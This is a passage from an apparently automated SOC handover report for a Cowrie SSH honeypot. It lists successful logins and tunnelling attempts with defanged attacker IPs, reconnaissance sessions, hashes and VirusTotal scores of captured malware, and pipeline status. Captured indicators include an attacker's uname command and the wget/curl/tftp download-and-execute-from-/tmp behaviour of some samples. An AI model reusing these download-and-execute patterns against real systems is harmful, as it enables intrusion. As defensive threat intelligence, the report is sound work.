| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:51:23` | `cowrie.session.connect` |
| `2026-08-17 06:51:23` | `cowrie.client.version` |
| `2026-08-17 06:51:23` | `cowrie.client.kex` |
| `2026-08-17 06:51:25` | `cowrie.login.failed` |
| `2026-08-17 06:51:26` | `cowrie.login.success` |
| `2026-08-17 06:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.89.252[.]58` to AbuseIPDB if not already reported
- [ ] Block `36.89.252[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8367102aac5f

| Field | Detail |
|---|---|
| **Source IP** | `82.65.140[.]218` |
| **First Seen** | 2026-08-17 06:51 |
| **Last Seen** | 2026-08-17 06:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:51:25` | `cowrie.session.connect` |
| `2026-08-17 06:51:25` | `cowrie.client.version` |
| `2026-08-17 06:51:25` | `cowrie.client.kex` |
| `2026-08-17 06:51:26` | `cowrie.login.success` |
| `2026-08-17 06:51:26` | `cowrie.direct-tcpip.request` |
| `2026-08-17 06:51:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.65.140[.]218` to AbuseIPDB if not already reported
- [ ] Block `82.65.140[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9a56f6b9b62

| Field | Detail |
|---|---|
| **Source IP** | `74.208.177[.]56` |
| **First Seen** | 2026-08-17 06:51 |
| **Last Seen** | 2026-08-17 06:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:51:31` | `cowrie.session.connect` |
| `2026-08-17 06:51:32` | `cowrie.client.version` |
| `2026-08-17 06:51:32` | `cowrie.client.kex` |
| `2026-08-17 06:51:33` | `cowrie.login.success` |
| `2026-08-17 06:51:33` | `cowrie.direct-tcpip.request` |
| `2026-08-17 06:51:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.208.177[.]56` to AbuseIPDB if not already reported
- [ ] Block `74.208.177[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd96414ccd99

| Field | Detail |
|---|---|
| **Source IP** | `87.103.126[.]54` |
| **First Seen** | 2026-08-17 06:52 |
| **Last Seen** | 2026-08-17 06:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:52:46` | `cowrie.session.connect` |
| `2026-08-17 06:52:46` | `cowrie.client.version` |
| `2026-08-17 06:52:46` | `cowrie.client.kex` |
| `2026-08-17 06:52:47` | `cowrie.login.success` |
| `2026-08-17 06:52:48` | `cowrie.direct-tcpip.request` |
| `2026-08-17 06:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.103.126[.]54` to AbuseIPDB if not already reported
- [ ] Block `87.103.126[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-021508bdca69

| Field | Detail |
|---|---|
| **Source IP** | `110.227.215[.]90` |
| **First Seen** | 2026-08-17 06:52 |
| **Last Seen** | 2026-08-17 06:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:52:55` | `cowrie.session.connect` |
| `2026-08-17 06:52:55` | `cowrie.client.version` |
| `2026-08-17 06:52:55` | `cowrie.client.kex` |
| `2026-08-17 06:52:57` | `cowrie.login.success` |
| `2026-08-17 06:52:58` | `cowrie.direct-tcpip.request` |
| `2026-08-17 06:53:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.227.215[.]90` to AbuseIPDB if not already reported
- [ ] Block `110.227.215[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04f0b92dc2c1

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 06:54 |
| **Last Seen** | 2026-08-17 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:54:58` | `cowrie.session.connect` |
| `2026-08-17 06:54:58` | `cowrie.client.version` |
| `2026-08-17 06:54:58` | `cowrie.client.kex` |
| `2026-08-17 06:54:59` | `cowrie.login.success` |
| `2026-08-17 06:54:59` | `cowrie.session.params` |
| `2026-08-17 06:54:59` | `cowrie.command.input` |
| `2026-08-17 06:55:00` | `cowrie.log.closed` |
| `2026-08-17 06:55:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **6642** | 2026-08-17 02:55 | 2026-08-17 06:54 | 7841m | 0 | `T1592` | 🟠 MEDIUM |
| `104.199.87[.]85` | **30** | 2026-08-17 06:16 | 2026-08-17 06:16 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `107.150.146[.]69` | **30** | 2026-08-17 02:57 | 2026-08-17 06:51 | 14m | 0 | `T1592` | 🟠 MEDIUM |
| `34.62.174[.]198` | **30** | 2026-08-17 05:35 | 2026-08-17 05:35 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `66.132.224[.]229` | **5** | 2026-08-17 04:47 | 2026-08-17 04:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **4** | 2026-08-17 04:01 | 2026-08-17 05:19 | 1m | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | **3** | 2026-08-17 03:15 | 2026-08-17 04:06 | 3m | 0 | `T1592` | 🟢 LOW |
| `136.119.118[.]84` | **2** | 2026-08-17 06:03 | 2026-08-17 06:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `143.208.44[.]2` | **2** | 2026-08-17 06:09 | 2026-08-17 06:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `184.15.181[.]6` | **2** | 2026-08-17 06:25 | 2026-08-17 06:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `198.12.46[.]116` | **2** | 2026-08-17 04:06 | 2026-08-17 04:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]70` | **2** | 2026-08-17 04:13 | 2026-08-17 04:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | **2** | 2026-08-17 06:31 | 2026-08-17 06:41 | 3m | 0 | `T1592` | 🟢 LOW |
| `40.124.173[.]235` | **2** | 2026-08-17 04:43 | 2026-08-17 04:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | **2** | 2026-08-17 04:49 | 2026-08-17 04:53 | 4m | 0 | `T1592` | 🟢 LOW |
| `71.204.98[.]188` | **2** | 2026-08-17 05:38 | 2026-08-17 05:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.81.191[.]20` | 1 | 2026-08-17 06:35 | 2026-08-17 06:35 | 30s | 0 | `T1592` | 🟢 LOW |
| `121.164.135[.]251` | 1 | 2026-08-17 06:42 | 2026-08-17 06:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `148.222.119[.]26` | 1 | 2026-08-17 05:51 | 2026-08-17 05:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `179.43.100[.]209` | 1 | 2026-08-17 04:05 | 2026-08-17 04:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.225.32[.]50` | 1 | 2026-08-17 06:35 | 2026-08-17 06:36 | 11s | 0 | `T1592` | 🟢 LOW |
| `182.76.36[.]62` | 1 | 2026-08-17 03:28 | 2026-08-17 03:28 | 4s | 0 | `T1592` | 🟢 LOW |
| `182.78.240[.]94` | 1 | 2026-08-17 05:27 | 2026-08-17 05:29 | 80s | 0 | `T1592` | 🟢 LOW |
| `185.137.250[.]66` | 1 | 2026-08-17 03:25 | 2026-08-17 03:26 | 10s | 0 | `T1592` | 🟢 LOW |
| `186.154.52[.]207` | 1 | 2026-08-17 05:27 | 2026-08-17 05:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `196.188.93[.]169` | 1 | 2026-08-17 03:43 | 2026-08-17 03:43 | 3s | 0 | `T1592` | 🟢 LOW |
| `200.69.58[.]226` | 1 | 2026-08-17 04:09 | 2026-08-17 04:09 | 11s | 0 | `T1592` | 🟢 LOW |
| `202.111.183[.]30` | 1 | 2026-08-17 03:01 | 2026-08-17 03:01 | 3s | 0 | `T1592` | 🟢 LOW |
| `216.244.248[.]79` | 1 | 2026-08-17 05:08 | 2026-08-17 05:08 | 10s | 0 | `T1592` | 🟢 LOW |
| `218.23.95[.]14` | 1 | 2026-08-17 04:35 | 2026-08-17 04:35 | 15s | 0 | `T1592` | 🟢 LOW |
| `220.179.87[.]204` | 1 | 2026-08-17 04:35 | 2026-08-17 04:36 | 49s | 0 | `T1592` | 🟢 LOW |
| `31.189.139[.]52` | 1 | 2026-08-17 03:12 | 2026-08-17 03:12 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]26` | 1 | 2026-08-17 04:45 | 2026-08-17 04:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.63.4[.]69` | 1 | 2026-08-17 03:12 | 2026-08-17 03:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-08-17 03:35 | 2026-08-17 03:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]11` | 1 | 2026-08-17 04:06 | 2026-08-17 04:06 | 1s | 0 | `T1592` | 🟢 LOW |
| `62.122.183[.]188` | 1 | 2026-08-17 04:01 | 2026-08-17 04:01 | 10s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]183` | 1 | 2026-08-17 03:48 | 2026-08-17 03:48 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.65.82[.]35` | 1 | 2026-08-17 06:43 | 2026-08-17 06:44 | 15s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]20` | 1 | 2026-08-17 05:27 | 2026-08-17 05:27 | 8s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]20` | 1 | 2026-08-17 04:44 | 2026-08-17 04:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]222` | 1 | 2026-08-17 04:20 | 2026-08-17 04:20 | 2s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]210` | 1 | 2026-08-17 06:44 | 2026-08-17 06:44 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/72** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `62.122.183[.]188` | RU | Gorset Ltd. | **100** ⚠️ | 2 |
| `34.62.174[.]198` | BE | Google LLC | **100** ⚠️ | 0 |
| `1.212.225[.]99` | KR | LG Uplus | **100** ⚠️ | 50 |
| `80.251.153[.]178` | NL | Amarutu Technology Ltd | **100** ⚠️ | 3 |
| `45.198.224[.]26` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 50 |
| `178.178.194[.]192` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `117.81.191[.]20` | CN | CHINANET jiangsu province network | **100** ⚠️ | 2 |
| `217.165.22[.]192` | AE | Emirates Telecommunications Corporation | **100** ⚠️ | 1 |
| `45.79.207[.]110` | US | Linode | **100** ⚠️ | 50 |
| `117.39.63[.]46` | CN | CHINANET Shanxi(SN) province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 161 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 155 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 3 |

---

## 🔕 False Positive Summary (112 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 11 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 72 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 25 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 6991 cases |
| Tool 34  | Credential Extractor        | ✅ 193 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 127 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 112 filtered (1.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 87 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 90 priority case(s) shown individually · 43 recon entry/entries in table (16 group(s) consolidating 6762 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-17T07:03:42Z_
